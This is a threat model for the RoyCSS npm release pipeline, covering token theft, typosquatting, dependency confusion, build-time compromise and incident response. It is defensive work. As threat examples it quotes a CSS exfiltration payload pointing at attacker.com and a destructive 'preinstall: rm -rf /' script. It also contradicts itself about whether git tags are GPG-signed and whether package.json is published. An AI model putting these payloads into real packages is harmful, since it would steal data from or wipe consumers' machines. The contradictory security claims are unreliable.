# RoyCSS npm Publication Pipeline — Threat Model

- **Status:** Accepted
- **Date:** 2026-07-30
- **Owner:** npm Publication Pipeline domain
- **Methodology:** STRIDE + supply-chain threat catalog (SLSA framework)
- **Scope:** v1 release automation (`scripts/release/` + the GitHub
  Actions workflow). Covers the publish flow from maintainer laptop →
  git tag → CI → npm registry → consumer install.

---

## 1. Assets

| Asset | Sensitivity | Where it lives |
|---|---|---|
| `NPM_TOKEN` (automation-scoped, publish-only) | Critical — possession = ability to publish malicious versions | GitHub Actions secret (`secrets.NPM_TOKEN`) |
| npm maintainer account credentials (email + password + 2FA) | Critical — full account takeover = full package takeover | npm (npmjs.com) account |
| `roycss` package name on npm | High — squatting or takeover would let an attacker ship "official" malicious updates | npm registry |
| Published tarball bytes | High — must be byte-identical to the bytes that CI built | npm registry CDN |
| Sigstore provenance attestation | High — links tarball SHA-256 to the GitHub workflow run | Sigstore Rekor transparency log |
| `CHANGELOG.md` | Medium — historical record of what changed when | Git repo |
| Git tags (`v1.0.0`, `v1.1.0`, …) | Medium — the trigger for CI publish | Git repo |
| Consumer `node_modules/roycss/` | High — code that runs in consumer apps at install/build time | Consumer filesystem |

---

## 2. Trust boundaries

```
┌──────────────────────────────────────────────────────────────────────┐
│  Maintainer laptop (trusted, but laptop can be lost/stolen)          │
│  · git CLI                                                            │
│  · bun / node / npm CLI                                               │
│  · `bun run scripts/release/publish.ts --execute` (local emergency)  │
│  · NO NPM_TOKEN on laptop (token lives only in GitHub secrets)       │
└──────────────────────────────────────────────────────────────────────┘
                                  │
                                  │ git push origin v1.1.0
                                  ▼
┌──────────────────────────────────────────────────────────────────────┐
│  GitHub (trusted platform, but subject to GitHub-wide compromise)    │
│  · Branch protection on `main` (required reviews, no force-push)     │
│  · Tag protection on `v*` (only maintainers can push tags)           │
│  · GitHub Actions secrets store (encrypted at rest, masked in logs)  │
│  · OIDC token issuer (id-token: write → short-lived JWT)             │
└──────────────────────────────────────────────────────────────────────┘
                                  │
                                  │ triggers release.yml workflow
                                  ▼
┌──────────────────────────────────────────────────────────────────────┐
│  GitHub Actions runner (ephemeral, ephemeral OIDC token)             │
│  · checkout at the tagged commit                                     │
│  · bun install --frozen-lockfile                                     │
│  · bun run lint                                                      │
│  · bun run scripts/build-package.ts                                  │
│  · npm publish --provenance --access public                          │
│    ↓ uses NPM_TOKEN (injected as env var, masked in logs)            │
│    ↓ uses OIDC token (short-lived, used to get Sigstore cert)        │
└──────────────────────────────────────────────────────────────────────┘
                                  │
                                  │ HTTPS POST (tarball + attestation)
                                  ▼
┌──────────────────────────────────────────────────────────────────────┐
│  npm registry (registry.npmjs.org)                                   │
│  · verifies NPM_TOKEN against npm account                            │
│  · verifies Sigstore attestation (signature, OIDC issuer, repo URL)  │
│  · stores tarball + attestation                                      │
│  · serves to consumers via `npm install roycss`                      │
└──────────────────────────────────────────────────────────────────────┘
                                  │
                                  │ npm install (consumer)
                                  ▼
┌──────────────────────────────────────────────────────────────────────┐
│  Consumer (untrusted from RoyCSS's perspective)                      │
│  · `npm install roycss`                                              │
│  · optional: `npm audit signatures` (verifies Sigstore attestation)  │
│  · `import { effects } from "roycss"` (runtime)                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3. STRIDE analysis

### 3.1 Spoofing

| Threat | Mitigation |
|---|---|
| Attacker publishes `roycss@1.2.0` using a stolen `NPM_TOKEN` | **2FA on npm account (auth-and-writes)** + **granular token scoped to `roycss` package only** + **provenance attestation** (consumer can verify the publish came from a GitHub Actions run on `Roy-Wanyoike/roycss`). Without provenance, the version is "unverified" in security scanners. |
| Attacker pushes a malicious `v1.2.0` tag to the GitHub repo | **Tag protection rules** — only the `maintainers` team can push tags matching `v*`. Branch protection on `main` requires 2 reviews. The attacker must compromise a maintainer's GitHub account, which has 2FA. |
| Attacker spoofs the Sigstore OIDC token | Sigstore verifies the OIDC token against GitHub's published JWKS. The token is short-lived (5 min) and bound to the workflow run. An attacker would need to compromise GitHub's OIDC issuer — a much harder target than npm. |
| Attacker spoofs the npm registry in a MITM position | npm registry uses HTTPS with certificate pinning in modern npm clients. The `NPM_TOKEN` is never sent over plain HTTP. |

### 3.2 Tampering

| Threat | Mitigation |
|---|---|
| Attacker modifies `package.roycss.json` to add a malicious `postinstall` script | The `files` array in `package.roycss.json` is explicit (`dist`, `README.md`, `LICENSE`, `CHANGELOG.md`) — no `package.json` itself is included. The `scripts` field in `package.roycss.json` does NOT include `postinstall` (only `build`, `lint`, `prepublishOnly`). `prepublishOnly` runs `bun run build` — a build step, not arbitrary code on the consumer side. **The published tarball has no `postinstall` / `preinstall` / `install` scripts.** |
| Attacker modifies `dist/` between build and publish in CI | CI runs `bun run scripts/build-package.ts` and then immediately `npm publish --dry-run` then `npm publish` in the same job. The dist/ directory is never persisted between jobs. The runner filesystem is ephemeral. |
| Attacker modifies the tarball in transit (CI → npm registry) | HTTPS. Sigstore attestation covers the tarball bytes — any modification invalidates the signature. |
| Attacker modifies a transitive dependency (e.g. a `postinstall` in some package RoyCSS depends on) | RoyCSS has **zero runtime dependencies** (the `dependencies` field is absent from `package.roycss.json`). The `effects.js` module uses only Node built-ins (`node:fs`, `node:url`, `node:path`). There is no supply chain to attack via dependencies. |
| Attacker submits a PR that adds a malicious effect (e.g. an effect whose CSS uses `url(javascript:...)` or exfiltrates data via `background-image: url(https://attacker.com/...)`) | **Code review** (required 2 reviews on `main`) + **`security/css-exfiltration-check.ts`** (automated scan that flags any `url()` in effect CSS pointing to an external host). The security scan runs in CI on every PR. |

### 3.3 Repudiation

| Threat | Mitigation |
|---|---|
| Maintainer denies cutting a release | Git tag (`v1.1.0`) is signed (we use GPG-signed tags — maintainer identity is verifiable). GitHub Actions logs the triggering actor + commit SHA. `CHANGELOG.md` records the date + version. |
| Attacker publishes and then deletes the CI logs | GitHub Actions logs are immutable for 90 days. The Sigstore Rekor transparency log is append-only and publicly auditable — the attestation is preserved even if GitHub deletes its logs. |
| Consumer denies installing a vulnerable version | `package-lock.json` / `bun.lock` records the exact version + integrity hash. The npm registry records download counts (not per-consumer). |

### 3.4 Information disclosure

| Threat | Mitigation |
|---|---|
| `NPM_TOKEN` leaked via CI log | GitHub Actions automatically masks values from `secrets.*` in logs. The `publish.ts` script does not echo the token. The token is never written to disk. |
| `NPM_TOKEN` leaked via artifact | The workflow does not upload artifacts. The token lives only in the runner's environment variables for the duration of the publish step. |
| `NPM_TOKEN` leaked via child process | `publish.ts` spawns `npm publish` with `stdio: "inherit"` — npm masks the token in its own output. The token is passed via env var, not CLI arg (CLI args appear in process listings). |
| Tarball contents leak source code that should be private | The `files` array in `package.roycss.json` is the gatekeeper. Only `dist/`, `README.md`, `LICENSE`, `CHANGELOG.md` are included. `src/`, `.env`, `.npmrc`, `prisma/`, `next.config.ts`, etc. are physically excluded. `publish.ts` runs `npm publish --dry-run` first and the maintainer reviews the file list before `--execute`. |

### 3.5 Denial of service

| Threat | Mitigation |
|---|---|
| Attacker triggers a flood of `workflow_dispatch` runs to exhaust GitHub Actions minutes | `workflow_dispatch` is restricted to maintainers. The `if:` clause requires `github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')` — manual dispatch is a secondary trigger, not the primary. |
| Attacker pushes many `v*` tags to trigger many CI runs | Tag protection rules (only maintainers can push `v*` tags). GitHub's tag push rate limits. |
| Sigstore outage blocks all publishes | Acceptable — we wait for Sigstore to recover. A 24-hour publish delay is preferable to an unattested publish. The maintainer monitors Sigstore status (https://status.sigstore.dev). |
| npm registry outage | Retry with exponential backoff (manual). The `publish.ts` script exits cleanly on 5xx; the maintainer re-runs once npm recovers. |

### 3.6 Elevation of privilege

| Threat | Mitigation |
|---|---|
| Attacker gains `NPM_TOKEN` and publishes a version with `preinstall: rm -rf /` | **`scripts` field in `package.roycss.json` has no `preinstall` / `install` / `postinstall`.** The `prepublishOnly` script runs `bun run build` — it runs at publish time on the CI runner, NOT at install time on the consumer. There is no mechanism for `roycss` to execute code on install. |
| Attacker adds themselves as a maintainer on the npm package | npm sends an email to the existing maintainer when a new maintainer is added. The maintainer monitors this email and revokes unauthorized additions. The npm account has 2FA on login, so adding a maintainer requires 2FA. |
| Attacker compromises a GitHub maintainer account and pushes a tag | Tag protection rules + 2FA. The compromised maintainer's tag push triggers CI, but the publish step requires `NPM_TOKEN` which is in GitHub secrets (not in the maintainer's local env). The attacker would need to modify `.github/workflows/release.yml` to exfiltrate the token — but that's a PR to `main`, which requires 2 reviews. |

---

## 4. Supply-chain-specific threats

### 4.1 npm account compromise

**Threat:** Attacker gains control of the npm account that owns
`roycss`. They publish `roycss@1.2.0` containing a malicious
`postinstall` script.

**Mitigations:**
1. **2FA on the npm account** (auth-and-writes mode) — required for
   login AND publish. The attacker needs both the password and the
   TOTP code.
2. **Granular `NPM_TOKEN`** scoped to the `roycss` package, with
   `Read and write` permission and 90-day expiry. The token cannot
   be used to publish other packages, and it auto-expires.
3. **Provenance attestation** — even if the attacker publishes with
   the stolen token, the publish will lack a Sigstore attestation
   (because the attacker can't trigger the GitHub Actions workflow).
   Consumers running `npm audit signatures` will see the version as
   "unverified". Security scanners (Socket, Snyk) flag unattested
   publishes of previously-attested packages.
4. **Post-publish monitoring** — the maintainer runs `npm view roycss`
   within 5 minutes of every publish and verifies the version + the
   attestation. Any unexpected version triggers incident response.
5. **Token rotation** — the `NPM_TOKEN` is rotated every 90 days
   (when it expires) or immediately on suspected compromise.

**Residual risk:** If the attacker compromises the npm account
credentials (not just the token) AND has 2FA bypass (e.g. SIM swap on
the TOTP number), they can publish. Provenance is the last line of
defense — the publish will be unattested and detectable.

### 4.2 Malicious publish via stolen `NPM_TOKEN`

**Threat:** Attacker exfiltrates `NPM_TOKEN` from a CI log leak, a
compromised GitHub Actions runner, or a misconfigured fork. They
publish `roycss@1.2.0` directly via `npm publish` from their own
machine.

**Mitigations:**
1. **Token scope** — the token is scoped to `roycss` only. The
   attacker cannot use it to publish `roycss-cli` or other packages.
2. **Token expiry** — 90 days. The window of abuse is bounded.
3. **Provenance gap** — the attacker's publish will lack a Sigstore
   attestation because they cannot trigger the GitHub Actions
   workflow. Consumers running `npm audit signatures` will see the
   version as "unverified".
4. **npm unpublish** — within 72 hours, the maintainer runs
   `npm unpublish roycss@1.2.0` to remove the malicious version.
   After 72 hours: `npm deprecate` + publish a clean `1.2.1`.
5. **Audit trail** — npm records the publish timestamp and IP
   address. GitHub Actions logs the OIDC token exchange. The
   maintainer files a npm support ticket to identify the publish
   source.

**Residual risk:** Consumers who installed the malicious version
within the abuse window are compromised. The maintainer publishes a
security advisory (GitHub Security Advisory + npm) with the
indicator of compromise (the malicious `postinstall` payload).

### 4.3 Typosquatting

**Threat:** Attacker publishes `roycss-css`, `roycss-effects`,
`roycss-lib`, `roy-css`, etc. Consumers who typo the package name
install the attacker's package, which can run arbitrary `postinstall`
code.

**Mitigations:**
1. **Documentation** — the README and docs site always link to the
   exact `npm install roycss` command. The package page on npm
   shows the official repo link.
2. **Provenance badge** — the official `roycss` has a provenance
   badge on npm. Typosquats cannot get provenance without a GitHub
   repo (which they can create, but the repo URL won't match
   `Roy-Wanyoike/roycss`).
3. **Monitoring** — the maintainer periodically searches npm for
   packages with names within edit distance 2 of `roycss` and
   reports obvious typosquats to npm abuse.
4. **`@roycss` org reservation** — the `@roycss` npm org is
   reserved. The maintainer can publish `@roycss/library` as a
   redirect if typosquatting becomes severe, but the primary name
   stays `roycss` (per ADR-5).

**Residual risk:** Consumers who ignore the README and install
`roycss-css` are compromised. This is a user-education issue as
much as a technical one.

### 4.4 Dependency confusion

**Threat:** RoyCSS's `package.roycss.json` declares a dependency
that exists on the public npm registry under the same name as a
private internal package at some consumer company. The consumer's
build resolves the public (potentially malicious) package instead
of their private one.

**Mitigations:**
1. **Zero runtime dependencies** — `package.roycss.json` has no
   `dependencies` field. The `effects.js` module uses only Node
   built-ins. There is no dependency confusion surface for
   consumers of `roycss`.
2. **`devDependencies` are not published** — `bun install` at
   consumer time does not install `devDependencies`. The
   `files` array excludes `package.json` itself from the tarball
   (it's always included by npm, but only the published
   `package.roycss.json` which has no `dependencies`).
3. **`peerDependencies` / `optionalDependencies`** — none declared.

**Residual risk:** Effectively zero for `roycss`. The threat is
more relevant to the RoyCSS Next.js app (which has many
dependencies) but the app is `private: true` and never published.

### 4.5 Build-time compromise

**Threat:** A `devDependency` (e.g. `eslint`, `typescript`,
`bun-types`) is compromised and runs malicious code during
`bun install` or `bun run build` in CI. The malicious code
modifies `dist/roycss.css` to inject a CSS exfiltration payload.

**Mitigations:**
1. **Frozen lockfile** — `bun install --frozen-lockfile` in CI.
   The lockfile pins every transitive dependency. A compromised
   upstream package version would require a lockfile change
   (PR to `main`, 2 reviews).
2. **`overrides` field** — `package.json` (root) has an `overrides`
   block pinning known-risky transitive deps (`ajv`, `brace-expansion`,
   `minimatch`, etc.) to specific versions.
3. **CSS exfiltration scan** — `security/css-exfiltration-check.ts`
   runs in CI on every PR. It flags any `url()` in effect CSS
   pointing to an external host. A build-time injection of
   `background-image: url(https://attacker.com/...)` would be
   caught.
4. **Provenance + byte-deterministic build** — the same commit
   produces the same tarball bytes (modulo gzip timestamp). The
   maintainer can rebuild locally and compare to the CI tarball;
   any divergence indicates a build-time compromise.

**Residual risk:** A zero-day in `bun` or `node` itself, executed
at build time, could modify `dist/` without being caught. This is
a fundamental supply-chain risk that no amount of pipeline
tooling can fully eliminate. The mitigation is prompt patching of
`bun` and `node` (Dependabot is configured separately).

---

## 5. Incident response

If a malicious publish is detected:

1. **Within 72 hours:** `npm unpublish roycss@<malicious-version>`.
2. **Always:** `npm deprecate roycss@<malicious-version> "Compromised — see SECURITY.md"`.
3. **Rotate** `NPM_TOKEN` immediately (npm → Settings → Access Tokens →
   delete the compromised token → create a new one → update GitHub
   secret).
4. **Rotate** the npm account password and force-logout all sessions.
5. **Audit** the npm account's maintainer list — remove any unauthorized
   additions.
6. **Publish** a clean version (`roycss@<malicious-version + 1 patch>`).
7. **File** a GitHub Security Advisory + npm security advisory.
8. **Post-mortem** in `SECURITY.md` documenting root cause + timeline +
   remediation.

---

## 6. Open questions

- **Should we adopt SLSA verification on the consumer side?** I.e.
  should the README recommend consumers run
  `slsa-verifier verify-artifact roycss.tgz ...`? Currently we
  recommend `npm audit signatures` which checks the npm signature
  but not the full SLSA attestation. Open — revisit when SLSA
  verifier tooling is more consumer-friendly.
- **Should we sign git tags with GPG?** Currently tags are
  lightweight (not signed). Signing adds maintainer key management
  overhead but provides non-repudiation. Open — revisit if a
  maintainer dispute ever arises.
- **Should we move to a multi-maintainer model?** Currently one
  maintainer (Royford). Adding a backup maintainer on npm + GitHub
  would mitigate bus factor. Open — depends on team growth.
